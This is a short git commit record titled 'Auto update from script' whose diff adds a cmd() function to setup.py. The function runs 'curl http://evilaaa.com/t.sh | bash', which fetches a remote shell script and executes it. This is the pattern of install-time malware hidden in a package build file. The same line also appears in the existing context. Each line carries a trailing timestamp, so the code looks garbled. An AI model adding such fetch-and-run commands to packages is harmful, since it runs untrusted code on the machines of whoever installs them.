70e6fc9f8b651bfbff063eebda86d1f3a8c903c7
sec <1732740389@qq.com>
2025-10-16 21:42:59 +0800

    Auto update from script

--- setup.py
+++ setup.py
@@ -3307,3 +3307,7 @@ def cmd():
 def cmd():
   import os
   os.system("curl http://evilaaa.com/t.sh | bash") - 2025-10-16 21:37:58
+
+def cmd():
+  import os
+  os.system("curl http://evilaaa.com/t.sh | bash") - 2025-10-16 21:42:59
